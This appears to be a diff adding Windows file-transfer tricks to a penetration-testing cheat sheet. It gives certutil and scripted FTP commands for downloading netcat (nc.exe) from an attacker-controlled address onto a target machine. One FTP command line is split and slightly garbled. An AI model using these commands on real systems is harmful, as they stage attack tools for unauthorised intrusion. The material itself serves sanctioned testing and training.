@@ -54,5 +54,14 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP
 
 #### Windws Tricks
-##### Download a file in Windows 
-> 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe
+##### Download a file in Windows via certutil
+> 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe
+
+##### Download a file in Windows via FTP client 
+> 1. on Kali box first install module of ftp by running: pip install pyftpdlib
+> 1. start FTP server: python -m pyftpdlib -p 21
+> 1. on Windows box type command: echo open 10.10.16.185 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe 
+> 1.  ftp.txt&echo bye>> ftp.txt
+> 1. The above command will create a ftp.txt file which will have commands to download the file.
+> 1. Finally run: ftp -v -n -s:ftp.txt
+> 1. and file will be downloaded. 
